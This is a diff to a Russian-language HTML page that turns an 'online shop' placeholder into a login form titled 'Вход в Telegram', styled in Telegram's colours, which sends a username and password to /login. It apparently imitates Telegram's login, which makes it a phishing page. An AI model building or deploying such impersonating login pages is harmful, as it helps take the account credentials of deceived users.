@@ -2,15 +2,57 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport"
-          content="width=device-width, user-scalable=no, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Shop</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в Telegram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h2 {
+            text-align: center;
+            color: #0088cc;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0077b3;
+        }
+    </style>
 </head>
 <body>
-<div id="main">
-    <h1>Онлайн магазин</h1>
-    <img src="https://www.flaticon.com/free-icon/telegram_2111646?term=telegram&page=1&position=1&origin=search&related_id=2111646">
-    <p>Lorem ipsum dolor sit amet, consecter adipisicing elit. Accusantium ipsum magni, molestias.</p>
-    <button id="login">Войти</button>
-</div>
+    <div class="login-container">
+        <h2>Вход в Telegram</h2>
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Имя пользователя" required>
+            <input type="password" name="password" placeholder="Пароль" required>
+            <button type="submit">Войти</button>
+        </form>
+    </div>
+</body>
+</html>
